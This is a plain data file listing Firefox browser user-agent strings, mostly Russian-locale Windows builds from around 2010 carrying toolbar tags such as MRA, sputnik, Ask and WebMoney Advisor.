Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03397) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbMNC/3.8.0.12304 Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03658) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.2.0.34 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.7 (build 03658) Firefox/3.5.13 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03639) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.12) Gecko/2009072711 CentOS/3.0.12-1.el5.centos Firefox/3.0.12
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03270) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) s025vp
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.3.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) AskTbWCV5/3.8.0.12304 Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 MRA 5.3 (build 02552) Firefox/3.0.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.0.1.40
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03270) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100413 Firefox/3.6.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 AskTbNRO/3.14.1.20007 Firefox/3.6.26 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 (E1610124-05F5-2DC7-6656-4D1DA51A6029) MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbFXTV5/3.8.0.12304 Firefox/3.6.10 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03639) Firefox/3.6.10 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 MRA 5.7 (build 03649) Firefox/2.0.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 (.NET Client 3.5.30729.01)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02793) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbSPC/3.8.0.12304 Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 (2C582CFE-7E48-85CC-56B5-3935A67FEF1E) MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.5.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 AskTbPTV2/3.8.0.12304 Firefox/3.5.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729) sputnik 2.5.3.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbFXTV5/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.7 (build 03686) Firefox/2.0.0.20 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbTKR/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (X11; FreeBSD amd64; rv:18.0) Gecko/20100101 Firefox/18.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03270) Firefox/3.6.10
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.10) Gecko/20100915 Ubuntu/10.04 (lucid) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 (37D6835D-DE70-1175-D7EE-C9023FCAF205) MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03658) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03797) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 (D91A7732-9BCB-115C-8E8A-EDE1861D08B5) MRA 5.7 (build 03686) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbWCV5/3.8.0.12304 Firefox/3.6.8
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 s025vp
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.5.13 sputnik unknown
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.12) Gecko/20100907 Fedora/3.5.12-1.fc12 Firefox/3.5.12
Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0 AlexaToolbar/alxf-2.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100817 Gentoo Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03658) Firefox/3.6.10 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101001 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03638) Firefox/3.6.6 GTB7.1 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03384) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) AskTbFJS/3.8.0.12304 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 (.NET CLR 3.5.30729) sputnik 2.3.0.94
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.5.13 (.NET CLR 3.5.30729) sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbBT5/3.9.1.14019 Firefox/3.6.10
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.04 (lucid) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.4 (build 02647) Firefox/3.5.2 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 AskTbGLSV5/3.8.0.12304 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbSPC2/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.6 (build 03278) AskTbALSV5/3.8.0.12217 Firefox/3.5.13 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03649) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 (35DFC2FD-D5CD-87EA-79F9-E3E5D57586DA) MRA 5.7 (build 03686) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 sputnik 2.5.0.148
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11 (.NET CLR 3.5.30729) sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02746) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.7 (build 03649) Firefox/3.5.3 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.14) Gecko/20101001 Firefox/3.5.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.4 (build 02652) Firefox/3.5.13 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03402) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 AdCentriaIM/1.7 Firefox/3.6.11 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbBT5/3.8.0.12304 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.4 (build 02647) Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03686) Firefox/3.6.11 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbPTV/3.9.1.14019 Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbSPC2/3.8.0.12304 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.6 (build 03399) Firefox/3.0.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.3 (build 02552) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.7 (build 03686) Firefox/3.0.6 (.NET Client 3.5.30729.01)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11
Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0 AlexaToolbar/pNJuBjJf-2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03653) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03658) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 AskTbALSV5/3.15.15.35882 Firefox/3.6.28
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.5.3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 GTB7.1
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.10 (maverick) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.4 (build 02603) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03402) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbSPC2/3.8.0.12304 Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.3 (build 02552) Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20130221 Firefox/17.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.7 (build 03686) Firefox/3.5.14 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03773) Firefox/3.6.24 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20101001 MRA 5.6 (build 03278) AskTbALSV5/3.9.1.14019 Firefox/3.5.14 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.7 (build 03638) Firefox/3.5.14 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbWCV5/3.9.1.14019 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbFXTV5/3.9.1.14019 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03686) Firefox/3.6.11 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03399) Firefox/3.6.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.2.0.34
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 (BBF7E8F2-3508-332E-8807-6C8F56206CEC) Firefox/19.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.7 (build 03686) Firefox/3.5.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 AskTbFF/3.9.1.14019 Firefox/3.6.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03686) Firefox/3.6.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03402) Firefox/3.6.11 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03686) Firefox/3.6.11 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbALSV5/3.9.1.14019 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.6 (build 03278) Firefox/2.0.0.20 sputnik
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.5.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02647) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03686) Firefox/3.0.19 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.3.0.102
